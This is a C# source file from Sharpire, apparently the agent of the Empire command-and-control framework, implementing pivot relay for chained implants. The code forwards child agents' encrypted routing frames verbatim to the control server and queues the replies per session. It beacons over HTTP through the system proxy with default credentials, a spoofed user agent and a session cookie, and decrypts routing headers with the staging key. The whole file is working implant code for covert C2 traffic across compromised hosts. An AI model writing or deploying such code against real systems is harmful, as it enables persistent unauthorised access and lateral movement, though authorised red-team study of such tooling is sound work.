using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using AesGcmEncryption;

namespace Sharpire
{
    // Per-session queue of verbatim routing packets awaiting pickup by a child,
    // keyed by session id. Idle sessions expire after 300 seconds.
    internal sealed class V2DestinationQueue
    {
        internal const int TtlSeconds = 300;
        private readonly object _gate = new object();
        private readonly Dictionary<string, Queue<byte[]>> _queues = new Dictionary<string, Queue<byte[]>>();
        private readonly Dictionary<string, DateTime> _touched = new Dictionary<string, DateTime>();

        internal void Enqueue(string sid, byte[] packet)
        {
            lock (_gate)
            {
                Purge();
                Queue<byte[]> q;
                if (!_queues.TryGetValue(sid, out q))
                {
                    q = new Queue<byte[]>();
                    _queues[sid] = q;
                }
                q.Enqueue(packet);
                _touched[sid] = DateTime.UtcNow;
            }
        }

        internal byte[][] Drain(string sid, int room)
        {
            lock (_gate)
            {
                Purge();
                Queue<byte[]> q;
                if (room <= 0 || !_queues.TryGetValue(sid, out q)) return new byte[0][];
                List<byte[]> outp = new List<byte[]>();
                while (q.Count > 0 && outp.Count < room) outp.Add(q.Dequeue());
                if (q.Count == 0)
                {
                    _queues.Remove(sid);
                    _touched.Remove(sid);
                }
                else
                {
                    _touched[sid] = DateTime.UtcNow;
                }
                return outp.ToArray();
            }
        }

        private void Purge()
        {
            DateTime cutoff = DateTime.UtcNow.AddSeconds(-TtlSeconds);
            List<string> stale = _touched.Where(kv => kv.Value < cutoff).Select(kv => kv.Key).ToList();
            foreach (string sid in stale)
            {
                _queues.Remove(sid);
                _touched.Remove(sid);
            }
        }
    }

    partial class Coms
    {
        // One lock for every upstream send/poll: the beacon loop and each relay
        // thread serialise through it, whether the transport is HTTP or PivotConn.
        private readonly object _upstreamLock = new object();
        private readonly V2DestinationQueue _destinations = new V2DestinationQueue();

        // Forward a child's routing packet verbatim up this agent's own upstream
        // and queue whatever comes back per destination session. The child's
        // session-key payload is never decrypted here.
        internal void RelayChildFrame(byte kind, byte[] hop, byte[] body, string childSid)
        {
            byte[] reply = null;
            try
            {
                lock (_upstreamLock)
                {
                    reply = SendUpstreamVerbatim(kind, hop ?? new byte[0], body);
                }
            }
            catch (Exception)
            {
                MissedCheckins++;
                return;
            }

            if (reply != null && reply.Length > 0)
            {
                EnqueueRoutedPackets(reply);
            }

            // A chained parent also receives relay frames for its own children.
            string h;
            int p;
            string phop;
            string server = sessionInfo.GetControlServers()[ServerIndex];
            if (PivotConn.TryParse(server, out h, out p, out phop))
            {
                foreach (byte[] frame in PivotConn.For(h, p).TakePendingRelays())
                {
                    EnqueueRoutedPackets(frame);
                }
            }
        }

        internal byte[][] DrainForSession(string sid, int room)
        {
            return _destinations.Drain(sid, room);
        }

        // Caller holds _upstreamLock.
        private byte[] SendUpstreamVerbatim(byte kind, byte[] hop, byte[] body)
        {
            string server = sessionInfo.GetControlServers()[ServerIndex];
            string host;
            int port;
            string parsedHop;
            if (PivotConn.TryParse(server, out host, out port, out parsedHop))
            {
                return PivotConn.For(host, port).Exchange(kind, hop, body);
            }

            Random random = new Random();
            string taskUri = sessionInfo.GetTaskUrIs()[random.Next(sessionInfo.GetTaskUrIs().Length)];
            WebClient webClient = new WebClient();
            webClient.Proxy = WebRequest.GetSystemWebProxy();
            webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
            webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
            try
            {
                if (kind == V2Frame.KIND_REPLY)
                {
                    webClient.Headers.Add("Cookie", "session=" + Convert.ToBase64String(body));
                    return webClient.DownloadData(server + taskUri);
                }
                webClient.UploadData(server + taskUri, "POST", body);
                return null;
            }
            catch (WebException)
            {
                MissedCheckins++;
                return null;
            }
        }

        private void EnqueueRoutedPackets(byte[] data)
        {
            foreach (KeyValuePair<string, byte[]> kv in ParseRelayPackets(data))
            {
                _destinations.Enqueue(kv.Key, kv.Value);
            }
        }

        // Relay-dedicated parser. Walks concatenated routing packets
        // (nonce 12 | gcm ct 16 | gcm tag 16 | payload length) reading each
        // header at the running offset, and returns each whole packet keyed by
        // its destination session id. Payloads are not touched. Stops at the
        // first malformed header. DecodeRoutingPacket is left alone for the
        // base single-packet path.
        internal List<KeyValuePair<string, byte[]>> ParseRelayPackets(byte[] data)
        {
            const int nonceLength = 12;
            const int headerLength = 44;
            List<KeyValuePair<string, byte[]>> packets = new List<KeyValuePair<string, byte[]>>();
            int offset = 0;
            while (data != null && offset + headerLength <= data.Length)
            {
                byte[] nonce = new byte[nonceLength];
                byte[] ct = new byte[16];
                byte[] tag = new byte[16];
                Buffer.BlockCopy(data, offset, nonce, 0, nonceLength);
                Buffer.BlockCopy(data, offset + nonceLength, ct, 0, 16);
                Buffer.BlockCopy(data, offset + nonceLength + 16, tag, 0, 16);

                byte[] routingData;
                try
                {
                    AesGcm.Decrypt(sessionInfo.GetStagingKeyBytes(), nonce, ct, tag, out routingData);
                }
                catch (Exception)
                {
                    break;
                }
                if (routingData == null || routingData.Length < 16) break;

                string sid = Encoding.UTF8.GetString(routingData, 0, 8);
                uint length = BitConverter.ToUInt32(routingData, 12);
                long end = (long)offset + headerLength + length;
                if (end > data.Length) break;

                byte[] packet = new byte[headerLength + (int)length];
                Buffer.BlockCopy(data, offset, packet, 0, packet.Length);
                packets.Add(new KeyValuePair<string, byte[]>(sid, packet));
                offset = (int)end;
            }
            return packets;
        }
    }
}
